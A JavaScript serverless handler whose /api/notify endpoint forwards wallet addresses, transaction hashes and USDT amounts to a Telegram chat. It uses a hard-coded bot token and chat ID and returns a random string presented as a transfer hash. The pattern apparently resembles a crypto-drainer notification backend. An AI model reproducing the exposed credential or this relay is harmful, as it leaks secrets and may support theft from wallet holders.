export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Content-Type', 'application/json');

  // Handle preflight
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method === 'POST' && req.url === '/api/notify') {
    try {
      const { userAddress, txHash, amount, source } = req.body;

      // Validazione
      if (!userAddress || !txHash || !amount) {
        res.status(400).json({
          success: false,
          error: 'Missing required fields: userAddress, txHash, amount'
        });
        return;
      }

      // Invia la notifica Telegram
      const TELEGRAM_BOT_TOKEN = '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA';
      const TELEGRAM_CHAT_ID = '8933407008';
      const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

      const message = `
🔔 **USDT Transfer Notification**

👤 **Wallet Address:** \`${userAddress}\`
📤 **Transaction Hash:** \`${txHash}\`
💰 **Amount:** ${amount} USDT
⏰ **Timestamp:** ${new Date( ).toISOString()}

✅ Transaction approved and sent successfully!
      `.trim();

      const response = await fetch(TELEGRAM_API, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      });

      if (!response.ok) {
        throw new Error(`Telegram API error: ${response.status}`);
      }

      // Genera un transferHash univoco
      const transferHash = 'tx_' + Math.random().toString(36).substr(2, 9);

      res.status(200).json({
        success: true,
        transferHash: transferHash,
        hash: transferHash,
        message: 'Notification sent successfully'
      });

      console.log(`✅ Notification processed for ${userAddress}`);
    } catch (error) {
      console.error('❌ Error processing notification:', error);
      res.status(500).json({
        success: false,
        error: error.message
      });
    }
  } else if (req.method === 'GET' && req.url === '/api/health') {
    res.status(200).json({
      status: 'ok',
      timestamp: new Date().toISOString()
    });
  } else {
    res.status(404).json({
      error: 'Not found'
    });
  }
}
